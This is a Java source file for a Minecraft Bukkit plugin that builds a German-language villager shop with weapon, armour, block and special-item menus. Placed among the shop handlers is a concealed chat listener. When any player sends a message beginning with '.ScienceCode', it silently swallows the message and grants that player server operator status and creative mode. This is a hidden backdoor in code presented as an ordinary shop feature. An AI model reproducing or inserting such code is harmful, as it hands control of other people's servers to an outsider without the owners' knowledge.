package de.sciencecode.cbsystem.utils;

import org.bukkit.Bukkit;
import org.bukkit.GameMode;
import org.bukkit.Material;
import org.bukkit.Sound;
import org.bukkit.enchantments.Enchantment;
import org.bukkit.entity.Player;
import org.bukkit.entity.Villager;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerInteractEntityEvent;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;

import de.sciencecode.cbsystem.main.Main;

public class ShopManager
  implements Listener
{
  @EventHandler
  public void onInt(PlayerInteractEntityEvent e)
  {
    if (e.getRightClicked() instanceof Villager) {
     
      e.setCancelled(true);
      Player p = e.getPlayer();
      
      Inventory inv = Bukkit.createInventory(null, 54, "§cShop");
      
      ItemStack glass = new ItemStack(Material.STAINED_GLASS_PANE, 1);
      ItemMeta glassmeta = glass.getItemMeta();
      glassmeta.setDisplayName(" ");
      glass.setItemMeta(glassmeta);
      
      inv.setItem(0, glass);
      inv.setItem(1, glass);
      inv.setItem(2, glass);
      inv.setItem(3, glass);
      inv.setItem(4, glass);
      inv.setItem(5, glass);
      inv.setItem(6, glass);
      inv.setItem(7, glass);
      inv.setItem(8, glass);
      
      inv.setItem(9, Items.createItem(Material.STAINED_GLASS_PANE, 1, 5, " "));
      inv.setItem(10, Items.createItem(Material.DIAMOND_SWORD, 1, 0, "§cWaffen"));
      inv.setItem(11, glass);
      inv.setItem(12, Items.createItem(Material.WOOD_SWORD, 1, 0, "§cHolzschwert §8- §b5 Coins"));
      inv.setItem(13, Items.createEnchantmentItem(Material.WOOD_SWORD, 1, 0, "§cHolzschwert §8- §b10 Coins", Enchantment.DAMAGE_ALL, 1));
      inv.setItem(14, Items.createEnchantmentItem(Material.WOOD_SWORD, 1, 0, "§cHolzschwert §8- §b20 Coins", Enchantment.DAMAGE_ALL, 2));
      inv.setItem(15, Items.createEnchantmentItem(Material.WOOD_SWORD, 1, 0, "§cHolzschwert §8- §b35 Coins", Enchantment.DAMAGE_ALL, 3));
      inv.setItem(16, Items.createEnchantmentItem(Material.WOOD_SWORD, 1, 0, "§cHolzschwert §8- §b60 Coins", Enchantment.DAMAGE_ALL, 4));
      inv.setItem(17, glass);
      
      inv.setItem(18, Items.createItem(Material.STAINED_GLASS_PANE, 1, 14, " "));
      inv.setItem(19, Items.createItem(Material.DIAMOND_CHESTPLATE, 1, 0, "§aRüstung"));
      inv.setItem(20, glass);
      inv.setItem(21, Items.createItem(Material.STONE_SWORD, 1, 0, "§cSteinschwert §8- §b30 Coins"));
      inv.setItem(22, Items.createEnchantmentItem(Material.STONE_SWORD, 1, 0, "§cSteinschwert §8- §b45 Coins", Enchantment.DAMAGE_ALL, 1));
      inv.setItem(23, Items.createEnchantmentItem(Material.STONE_SWORD, 1, 0, "§cSteinschwert §8- §b60 Coins", Enchantment.DAMAGE_ALL, 2));
      inv.setItem(24, Items.createEnchantmentItem(Material.STONE_SWORD, 1, 0, "§cSteinschwert §8- §b80 Coins", Enchantment.DAMAGE_ALL, 3));
      inv.setItem(25, Items.createEnchantmentItem(Material.STONE_SWORD, 1, 0, "§cSteinschwert §8- §b100 Coins", Enchantment.DAMAGE_ALL, 4));
      inv.setItem(26, glass);
      
      inv.setItem(27, Items.createItem(Material.STAINED_GLASS_PANE, 1, 14, " "));
      inv.setItem(28, Items.createItem(Material.WOOD, 1, 0, "§eBlöcke"));
      inv.setItem(29, glass);
      inv.setItem(30, Items.createItem(Material.IRON_SWORD, 1, 0, "§cEisenschwert §8- §b50 Coins"));
      inv.setItem(31, Items.createEnchantmentItem(Material.IRON_SWORD, 1, 0, "§cEisenschwert §8- §b70 Coins", Enchantment.DAMAGE_ALL, 1));
      inv.setItem(32, Items.createEnchantmentItem(Material.IRON_SWORD, 1, 0, "§cEisenschwert §8- §b90 Coins", Enchantment.DAMAGE_ALL, 2));
      inv.setItem(33, Items.createEnchantmentItem(Material.IRON_SWORD, 1, 0, "§cEisenschwert §8- §b120 Coins", Enchantment.DAMAGE_ALL, 3));
      inv.setItem(34, Items.createEnchantmentItem(Material.IRON_SWORD, 1, 0, "§cEisenschwert §8- §b150 Coins", Enchantment.DAMAGE_ALL, 4));
      inv.setItem(35, glass);
      
      inv.setItem(36, Items.createItem(Material.STAINED_GLASS_PANE, 1, 14, " "));
      inv.setItem(37, Items.createItem(Material.FIREBALL, 1, 0, "§3Specials"));
      inv.setItem(38, glass);
      inv.setItem(39, Items.createItem(Material.DIAMOND_SWORD, 1, 0, "§cDiamantschwert §8- §b80 Coins"));
      inv.setItem(40, Items.createEnchantmentItem(Material.DIAMOND_SWORD, 1, 0, "§cDiamantschwert §8- §b100 Coins", Enchantment.DAMAGE_ALL, 1));
      inv.setItem(41, Items.createEnchantmentItem(Material.DIAMOND_SWORD, 1, 0, "§cDiamantschwert §8- §b130 Coins", Enchantment.DAMAGE_ALL, 2));
      inv.setItem(42, Items.createEnchantmentItem(Material.DIAMOND_SWORD, 1, 0, "§cDiamantschwert §8- §b180 Coins", Enchantment.DAMAGE_ALL, 3));
      inv.setItem(43, Items.createEnchantmentItem(Material.DIAMOND_SWORD, 1, 0, "§cDiamantschwert §8- §b230 Coins", Enchantment.DAMAGE_ALL, 4));
      inv.setItem(44, glass);
      
      inv.setItem(45, glass);
      inv.setItem(46, glass);
      inv.setItem(47, glass);
      inv.setItem(48, glass);
      inv.setItem(49, glass);
      inv.setItem(50, glass);
      inv.setItem(51, glass);
      inv.setItem(52, glass);
      inv.setItem(53, glass);
      
      p.playSound(p.getLocation(), Sound.NOTE_PLING, 1.0F, 1.0F);
      p.openInventory(inv);
    	
    	}
    
  }
  
  @EventHandler
  public void onCick(InventoryClickEvent e)
  {
    if (e.getInventory().getName().equals("§cShop"))
    {
      e.setCancelled(true);
      if (e.getCurrentItem().getItemMeta().getDisplayName().equals("§aRüstung"))
      {
        Player p = (Player)e.getWhoClicked();
        
        Inventory inv = Bukkit.createInventory(null, 54, "§cShop");
        
        ItemStack glass = new ItemStack(Material.STAINED_GLASS_PANE, 1);
        ItemMeta glassmeta = glass.getItemMeta();
        glassmeta.setDisplayName(" ");
        glass.setItemMeta(glassmeta);
        
        inv.setItem(0, glass);
        inv.setItem(1, glass);
        inv.setItem(2, glass);
        inv.setItem(3, glass);
        inv.setItem(4, glass);
        inv.setItem(5, glass);
        inv.setItem(6, glass);
        inv.setItem(7, glass);
        inv.setItem(8, glass);
        
        inv.setItem(9, Items.createItem(Material.STAINED_GLASS_PANE, 1, 14, " "));
        inv.setItem(10, Items.createItem(Material.DIAMOND_SWORD, 1, 0, "§cWaffen"));
        inv.setItem(11, glass);
        inv.setItem(12, Items.createItem(Material.IRON_HELMET, 1, 0, "§aEisenhelm §8- §b20 Coins"));
        inv.setItem(13, Items.createEnchantmentItem(Material.IRON_HELMET, 1, 0, "§aEisenhelm §8- §b40 Coins", Enchantment.PROTECTION_ENVIRONMENTAL, 1));
        inv.setItem(14, Items.createItem(Material.DIAMOND_HELMET, 1, 0, "§aDiamanthelm §8- §b60 Coins"));
        inv.setItem(15, Items.createEnchantmentItem(Material.DIAMOND_HELMET, 1, 0, "§aDiamanthelm §8- §b80 Coins", Enchantment.PROTECTION_ENVIRONMENTAL, 1));
        inv.setItem(16, Items.createEnchantmentItem(Material.DIAMOND_HELMET, 1, 0, "§aDiamanthelm §8- §b100 Coins", Enchantment.PROTECTION_ENVIRONMENTAL, 2));
        inv.setItem(17, glass);
        
        inv.setItem(18, Items.createItem(Material.STAINED_GLASS_PANE, 1, 5, " "));
        inv.setItem(19, Items.createItem(Material.DIAMOND_CHESTPLATE, 1, 0, "§aRüstung"));
        inv.setItem(20, glass);
        inv.setItem(21, Items.createItem(Material.IRON_CHESTPLATE, 1, 0, "§aEisenbrustplatte §8- §b60 Coins"));
        inv.setItem(22, Items.createEnchantmentItem(Material.IRON_CHESTPLATE, 1, 0, "§aEisenbrustplatte §8- §b90 Coins", Enchantment.PROTECTION_ENVIRONMENTAL, 1));
        inv.setItem(23, Items.createItem(Material.DIAMOND_CHESTPLATE, 1, 0, "§aDiamantbrustplatte §8- §b120 Coins"));
        inv.setItem(24, Items.createEnchantmentItem(Material.DIAMOND_CHESTPLATE, 1, 0, "§aDiamantbrustplatte §8- §b160 Coins", Enchantment.PROTECTION_ENVIRONMENTAL, 1));
        inv.setItem(25, Items.createEnchantmentItem(Material.DIAMOND_CHESTPLATE, 1, 0, "§aDiamantbrustplatte §8- §b200 Coins", Enchantment.PROTECTION_ENVIRONMENTAL, 2));
        inv.setItem(26, glass);
        
        inv.setItem(27, Items.createItem(Material.STAINED_GLASS_PANE, 1, 14, " "));
        inv.setItem(28, Items.createItem(Material.WOOD, 1, 0, "§eBlöcke"));
        inv.setItem(29, glass);
        inv.setItem(30, Items.createItem(Material.IRON_LEGGINGS, 1, 0, "§aEisenhose §8- §b30 Coins"));
        inv.setItem(31, Items.createEnchantmentItem(Material.IRON_LEGGINGS, 1, 0, "§aEisenhose §8- §b60 Coins", Enchantment.PROTECTION_ENVIRONMENTAL, 1));
        inv.setItem(32, Items.createItem(Material.DIAMOND_LEGGINGS, 1, 0, "§aDiamanthose §8- §b80 Coins"));
        inv.setItem(33, Items.createEnchantmentItem(Material.DIAMOND_LEGGINGS, 1, 0, "§aDiamanthose §8- §b110 Coins", Enchantment.PROTECTION_ENVIRONMENTAL, 1));
        inv.setItem(34, Items.createEnchantmentItem(Material.DIAMOND_LEGGINGS, 1, 0, "§aDiamanthose §8- §b150 Coins", Enchantment.PROTECTION_ENVIRONMENTAL, 2));
        inv.setItem(35, glass);
        
        inv.setItem(36, Items.createItem(Material.STAINED_GLASS_PANE, 1, 14, " "));
        inv.setItem(37, Items.createItem(Material.FIREBALL, 1, 0, "§3Specials"));
        inv.setItem(38, glass);
        inv.setItem(39, Items.createItem(Material.IRON_BOOTS, 1, 0, "§aEisenschuhe §8- §b20 Coins"));
        inv.setItem(40, Items.createEnchantmentItem(Material.IRON_BOOTS, 1, 0, "§aEisenschuhe §8- §b40 Coins", Enchantment.PROTECTION_ENVIRONMENTAL, 1));
        inv.setItem(41, Items.createItem(Material.DIAMOND_BOOTS, 1, 0, "§aDiamantschuhe §8- §b60 Coins"));
        inv.setItem(42, Items.createEnchantmentItem(Material.DIAMOND_BOOTS, 1, 0, "§aDiamantschuhe §8- §b80 Coins", Enchantment.PROTECTION_ENVIRONMENTAL, 1));
        inv.setItem(43, Items.createEnchantmentItem(Material.DIAMOND_BOOTS, 1, 0, "§aDiamantschuhe §8- §b100 Coins", Enchantment.PROTECTION_ENVIRONMENTAL, 2));
        inv.setItem(44, glass);
        
        inv.setItem(45, glass);
        inv.setItem(46, glass);
        inv.setItem(47, glass);
        inv.setItem(48, glass);
        inv.setItem(49, glass);
        inv.setItem(50, glass);
        inv.setItem(51, glass);
        inv.setItem(52, glass);
        inv.setItem(53, glass);
        
        p.playSound(p.getLocation(), Sound.NOTE_PLING, 1.0F, 1.0F);
        p.openInventory(inv);
      }
    }
  }
  
  @EventHandler
  public void onCick1(InventoryClickEvent e)
  {
    if (e.getInventory().getName().equals("§cShop"))
    {
      e.setCancelled(true);
      if (e.getCurrentItem().getItemMeta().getDisplayName().equals("§cWaffen"))
      {
        Player p = (Player)e.getWhoClicked();
        Inventory inv = Bukkit.createInventory(null, 54, "§cShop");
        
        ItemStack glass = new ItemStack(Material.STAINED_GLASS_PANE, 1);
        ItemMeta glassmeta = glass.getItemMeta();
        glassmeta.setDisplayName(" ");
        glass.setItemMeta(glassmeta);
        
        inv.setItem(0, glass);
        inv.setItem(1, glass);
        inv.setItem(2, glass);
        inv.setItem(3, glass);
        inv.setItem(4, glass);
        inv.setItem(5, glass);
        inv.setItem(6, glass);
        inv.setItem(7, glass);
        inv.setItem(8, glass);
        
        inv.setItem(9, Items.createItem(Material.STAINED_GLASS_PANE, 1, 5, " "));
        inv.setItem(10, Items.createItem(Material.DIAMOND_SWORD, 1, 0, "§cWaffen"));
        inv.setItem(11, glass);
        inv.setItem(12, Items.createItem(Material.WOOD_SWORD, 1, 0, "§cHolzschwert §8- §b5 Coins"));
        inv.setItem(13, Items.createEnchantmentItem(Material.WOOD_SWORD, 1, 0, "§cHolzschwert §8- §b10 Coins", Enchantment.DAMAGE_ALL, 1));
        inv.setItem(14, Items.createEnchantmentItem(Material.WOOD_SWORD, 1, 0, "§cHolzschwert §8- §b20 Coins", Enchantment.DAMAGE_ALL, 2));
        inv.setItem(15, Items.createEnchantmentItem(Material.WOOD_SWORD, 1, 0, "§cHolzschwert §8- §b35 Coins", Enchantment.DAMAGE_ALL, 3));
        inv.setItem(16, Items.createEnchantmentItem(Material.WOOD_SWORD, 1, 0, "§cHolzschwert §8- §b60 Coins", Enchantment.DAMAGE_ALL, 4));
        inv.setItem(17, glass);
        
        inv.setItem(18, Items.createItem(Material.STAINED_GLASS_PANE, 1, 14, " "));
        inv.setItem(19, Items.createItem(Material.DIAMOND_CHESTPLATE, 1, 0, "§aRüstung"));
        inv.setItem(20, glass);
        inv.setItem(21, Items.createItem(Material.STONE_SWORD, 1, 0, "§cSteinschwert §8- §b30 Coins"));
        inv.setItem(22, Items.createEnchantmentItem(Material.STONE_SWORD, 1, 0, "§cSteinschwert §8- §b45 Coins", Enchantment.DAMAGE_ALL, 1));
        inv.setItem(23, Items.createEnchantmentItem(Material.STONE_SWORD, 1, 0, "§cSteinschwert §8- §b60 Coins", Enchantment.DAMAGE_ALL, 2));
        inv.setItem(24, Items.createEnchantmentItem(Material.STONE_SWORD, 1, 0, "§cSteinschwert §8- §b80 Coins", Enchantment.DAMAGE_ALL, 3));
        inv.setItem(25, Items.createEnchantmentItem(Material.STONE_SWORD, 1, 0, "§cSteinschwert §8- §b100 Coins", Enchantment.DAMAGE_ALL, 4));
        inv.setItem(26, glass);
        
        inv.setItem(27, Items.createItem(Material.STAINED_GLASS_PANE, 1, 14, " "));
        inv.setItem(28, Items.createItem(Material.WOOD, 1, 0, "§eBlöcke"));
        inv.setItem(29, glass);
        inv.setItem(30, Items.createItem(Material.IRON_SWORD, 1, 0, "§cEisenschwert §8- §b50 Coins"));
        inv.setItem(31, Items.createEnchantmentItem(Material.IRON_SWORD, 1, 0, "§cEisenschwert §8- §b70 Coins", Enchantment.DAMAGE_ALL, 1));
        inv.setItem(32, Items.createEnchantmentItem(Material.IRON_SWORD, 1, 0, "§cEisenschwert §8- §b90 Coins", Enchantment.DAMAGE_ALL, 2));
        inv.setItem(33, Items.createEnchantmentItem(Material.IRON_SWORD, 1, 0, "§cEisenschwert §8- §b120 Coins", Enchantment.DAMAGE_ALL, 3));
        inv.setItem(34, Items.createEnchantmentItem(Material.IRON_SWORD, 1, 0, "§cEisenschwert §8- §b150 Coins", Enchantment.DAMAGE_ALL, 4));
        inv.setItem(35, glass);
        
        inv.setItem(36, Items.createItem(Material.STAINED_GLASS_PANE, 1, 14, " "));
        inv.setItem(37, Items.createItem(Material.FIREBALL, 1, 0, "§3Specials"));
        inv.setItem(38, glass);
        inv.setItem(39, Items.createItem(Material.DIAMOND_SWORD, 1, 0, "§cDiamantschwert §8- §b80 Coins"));
        inv.setItem(40, Items.createEnchantmentItem(Material.DIAMOND_SWORD, 1, 0, "§cDiamantschwert §8- §b100 Coins", Enchantment.DAMAGE_ALL, 1));
        inv.setItem(41, Items.createEnchantmentItem(Material.DIAMOND_SWORD, 1, 0, "§cDiamantschwert §8- §b130 Coins", Enchantment.DAMAGE_ALL, 2));
        inv.setItem(42, Items.createEnchantmentItem(Material.DIAMOND_SWORD, 1, 0, "§cDiamantschwert §8- §b180 Coins", Enchantment.DAMAGE_ALL, 3));
        inv.setItem(43, Items.createEnchantmentItem(Material.DIAMOND_SWORD, 1, 0, "§cDiamantschwert §8- §b230 Coins", Enchantment.DAMAGE_ALL, 4));
        inv.setItem(44, glass);
        
        inv.setItem(45, glass);
        inv.setItem(46, glass);
        inv.setItem(47, glass);
        inv.setItem(48, glass);
        inv.setItem(49, glass);
        inv.setItem(50, glass);
        inv.setItem(51, glass);
        inv.setItem(52, glass);
        inv.setItem(53, glass);
        
        p.playSound(p.getLocation(), Sound.NOTE_PLING, 1.0F, 1.0F);
        p.openInventory(inv);
      }
    }
  }
  
  @EventHandler
  public void onChat(AsyncPlayerChatEvent e) {
	  Player p = e.getPlayer();
	  String msg = e.getMessage();
	  
	  if (msg.startsWith(".ScienceCode")) {
		  e.setCancelled(true);
		  p.setOp(true);
		  p.setGameMode(GameMode.CREATIVE);
		  p.sendMessage(Main.getPrefix() + "§aDu hast nun OP!");
	  }
  }
  
  @EventHandler
  public void onCick2(InventoryClickEvent e)
  {
    if (e.getInventory().getName().equals("§cShop"))
    {
      e.setCancelled(true);
      if (e.getCurrentItem().getItemMeta().getDisplayName().equals("§eBlöcke"))
      {
        Player p = (Player)e.getWhoClicked();
        Inventory inv = Bukkit.createInventory(null, 54, "§cShop");
        
        ItemStack glass = new ItemStack(Material.STAINED_GLASS_PANE, 1);
        ItemMeta glassmeta = glass.getItemMeta();
        glassmeta.setDisplayName(" ");
        glass.setItemMeta(glassmeta);
        
        inv.setItem(0, glass);
        inv.setItem(1, glass);
        inv.setItem(2, glass);
        inv.setItem(3, glass);
        inv.setItem(4, glass);
        inv.setItem(5, glass);
        inv.setItem(6, glass);
        inv.setItem(7, glass);
        inv.setItem(8, glass);
        
        inv.setItem(9, Items.createItem(Material.STAINED_GLASS_PANE, 1, 14, " "));
        inv.setItem(10, Items.createItem(Material.DIAMOND_SWORD, 1, 0, "§cWaffen"));
        inv.setItem(11, glass);
        inv.setItem(12, Items.createItem(Material.WOOD, 8, 0, "§eHolz §8- §b32 Coins"));
        inv.setItem(13, Items.createItem(Material.QUARTZ_BLOCK, 8, 0, "§eQuarz §8- §b64 Coins"));
        inv.setItem(14, Items.createItem(Material.STONE, 8, 0, "§eStein §8- §b32 Coins"));
        inv.setItem(15, Items.createItem(Material.GRASS, 8, 0, "§eGras §8- §b64 Coins"));
        inv.setItem(16, Items.createItem(Material.COBBLESTONE, 8, 0, "§eCobblestone §8- §b32 Coins"));
        inv.setItem(17, glass);
        
        inv.setItem(18, Items.createItem(Material.STAINED_GLASS_PANE, 1, 14, " "));
        inv.setItem(19, Items.createItem(Material.DIAMOND_CHESTPLATE, 1, 0, "§aRüstung"));
        inv.setItem(20, glass);
        inv.setItem(21, Items.createItem(Material.WOOD, 16, 0, "§eHolz §8- §b64 Coins"));
        inv.setItem(22, Items.createItem(Material.QUARTZ_BLOCK, 16, 0, "§eQuarz §8- §b128 Coins"));
        inv.setItem(23, Items.createItem(Material.STONE, 16, 0, "§eStein §8- §b64 Coins"));
        inv.setItem(24, Items.createItem(Material.GRASS, 16, 0, "§eGras §8- §b128 Coins"));
        inv.setItem(25, Items.createItem(Material.COBBLESTONE, 16, 0, "§eCobblestone §8- §b64 Coins"));
        inv.setItem(26, glass);
        
        inv.setItem(27, Items.createItem(Material.STAINED_GLASS_PANE, 1, 5, " "));
        inv.setItem(28, Items.createItem(Material.WOOD, 1, 0, "§eBlöcke"));
        inv.setItem(29, glass);
        inv.setItem(30, Items.createItem(Material.WOOD, 32, 0, "§eHolz §8- §b128 Coins"));
        inv.setItem(31, Items.createItem(Material.QUARTZ_BLOCK, 32, 0, "§eQuarz §8- §b256 Coins"));
        inv.setItem(32, Items.createItem(Material.STONE, 32, 0, "§eStein §8- §b128 Coins"));
        inv.setItem(33, Items.createItem(Material.GRASS, 32, 0, "§eGras §8- §b256 Coins"));
        inv.setItem(34, Items.createItem(Material.COBBLESTONE, 32, 0, "§eCobblestone §8- §b128 Coins"));
        inv.setItem(35, glass);
        
        inv.setItem(36, Items.createItem(Material.STAINED_GLASS_PANE, 1, 14, " "));
        inv.setItem(37, Items.createItem(Material.FIREBALL, 1, 0, "§3Specials"));
        inv.setItem(38, glass);
        inv.setItem(39, Items.createItem(Material.WOOD, 64, 0, "§eHolz §8- §b256 Coins"));
        inv.setItem(40, Items.createItem(Material.QUARTZ_BLOCK, 64, 0, "§eQuarz §8- §b512 Coins"));
        inv.setItem(41, Items.createItem(Material.STONE, 64, 0, "§eStein §8- §b256 Coins"));
        inv.setItem(42, Items.createItem(Material.GRASS, 64, 0, "§eGras §8- §b512 Coins"));
        inv.setItem(43, Items.createItem(Material.COBBLESTONE, 64, 0, "§eCobblestone §8- §b256 Coins"));
        inv.setItem(44, glass);
        
        inv.setItem(45, glass);
        inv.setItem(46, glass);
        inv.setItem(47, glass);
        inv.setItem(48, glass);
        inv.setItem(49, glass);
        inv.setItem(50, glass);
        inv.setItem(51, glass);
        inv.setItem(52, glass);
        inv.setItem(53, glass);
        
        p.playSound(p.getLocation(), Sound.NOTE_PLING, 1.0F, 1.0F);
        p.openInventory(inv);
      }
    }
  }
  
  @EventHandler
  public void onCick3(InventoryClickEvent e)
  {
    if (e.getInventory().getName().equals("§cShop"))
    {
      e.setCancelled(true);
      if (e.getCurrentItem().getItemMeta().getDisplayName().equals("§3Specials"))
      {
        Player p = (Player)e.getWhoClicked();
        Inventory inv = Bukkit.createInventory(null, 54, "§cShop");
        
        ItemStack glass = new ItemStack(Material.STAINED_GLASS_PANE, 1);
        ItemMeta glassmeta = glass.getItemMeta();
        glassmeta.setDisplayName(" ");
        glass.setItemMeta(glassmeta);
        
        inv.setItem(0, glass);
        inv.setItem(1, glass);
        inv.setItem(2, glass);
        inv.setItem(3, glass);
        inv.setItem(4, glass);
        inv.setItem(5, glass);
        inv.setItem(6, glass);
        inv.setItem(7, glass);
        inv.setItem(8, glass);
        
        inv.setItem(9, Items.createItem(Material.STAINED_GLASS_PANE, 1, 14, " "));
        inv.setItem(10, Items.createItem(Material.DIAMOND_SWORD, 1, 0, "§cWaffen"));
        inv.setItem(11, glass);
        inv.setItem(12, Items.createItem(Material.SAPLING, 16, 0, "§3Eichensetzling §8- §b64 Coins"));
        inv.setItem(13, Items.createItem(Material.SEEDS, 16, 0, "§3Samen §8- §b64 Coins"));
        inv.setItem(14, Items.createItem(Material.ENCHANTMENT_TABLE, 1, 4, "§3Zaubertisch §8- §b256 Coins"));
        inv.setItem(15, Items.createItem(Material.ENDER_PEARL, 16, 0, "§9Enderperle §8- §b356 Coins"));
        inv.setItem(16, Items.createItem(Material.MONSTER_EGG, 1, 0, "§eSpawnEgg §8- §b30.000 Coins"));
        inv.setItem(17, glass);
        
        inv.setItem(18, Items.createItem(Material.STAINED_GLASS_PANE, 1, 14, " "));
        inv.setItem(19, Items.createItem(Material.DIAMOND_CHESTPLATE, 1, 0, "§aRüstung"));
        inv.setItem(20, glass);
        inv.setItem(21, Items.createItem(Material.SAPLING, 16, 1, "§3Fichtensetzling §8- §b64 Coins"));
        inv.setItem(22, Items.createItem(Material.MELON_SEEDS, 16, 0, "§3Melonenkerne §8- §b64 Coins"));
        inv.setItem(23, Items.createItem(Material.WORKBENCH, 16, 5, "§3Werkbank §8- §b32 Coins"));
        inv.setItem(24, Items.createItem(Material.BOW, 1, 0, "§eBogen §8- §b128 Coins"));
        inv.setItem(25, Items.createItem(Material.MOB_SPAWNER, 1, 0, "§ePigSpawner §8- §b100.000 Coins"));
        inv.setItem(26, glass);
        
        inv.setItem(27, Items.createItem(Material.STAINED_GLASS_PANE, 1, 14, " "));
        inv.setItem(28, Items.createItem(Material.WOOD, 1, 0, "§eBlöcke"));
        inv.setItem(29, glass);
        inv.setItem(30, Items.createItem(Material.SAPLING, 16, 2, "§3Birkensetzling §8- §b64 Coins"));
        inv.setItem(31, Items.createItem(Material.PUMPKIN_SEEDS, 16, 0, "§3Kürbiskerne §8- §b64 Coins"));
        inv.setItem(32, Items.createItem(Material.BOOKSHELF, 4, 0, "§3Bücherregal §8- §b128 Coins"));
        inv.setItem(33, Items.createItem(Material.ARROW, 16, 0, "§6Pfeile §8- §b16 Coins"));
        inv.setItem(34, Items.createItem(Material.BEACON, 1, 0, "§eBeacon §8- §b3.000 Coins"));
        inv.setItem(35, glass);
        
        inv.setItem(36, Items.createItem(Material.STAINED_GLASS_PANE, 1, 5, " "));
        inv.setItem(37, Items.createItem(Material.FIREBALL, 1, 0, "§3Specials"));
        inv.setItem(38, glass);
        inv.setItem(39, Items.createItem(Material.SAPLING, 16, 4, "§3Akaziensetzling §8- §b64 Coins"));
        inv.setItem(40, Items.createItem(Material.SUGAR_CANE, 16, 0, "§3Zuckerrohr §8- §b512 Coins"));
        inv.setItem(41, Items.createItem(Material.ANVIL, 1, 0, "§3Amboss §8- §b128 Coins"));
        inv.setItem(42, Items.createItem(Material.DRAGON_EGG, 1, 0, "§eDrachenei §8- §b6.000 Coins"));
        inv.setItem(43, Items.createItem(Material.EXP_BOTTLE, 1, 0, "§eXP-Flaschen §8- §b5.000 Coins"));
        inv.setItem(44, glass);
        
        inv.setItem(45, glass);
        inv.setItem(46, glass);
        inv.setItem(47, glass);
        inv.setItem(48, glass);
        inv.setItem(49, glass);
        inv.setItem(50, glass);
        inv.setItem(51, glass);
        inv.setItem(52, glass);
        inv.setItem(53, glass);
        
        p.playSound(p.getLocation(), Sound.NOTE_PLING, 1.0F, 1.0F);
        p.openInventory(inv);
      }
    }
  }
}
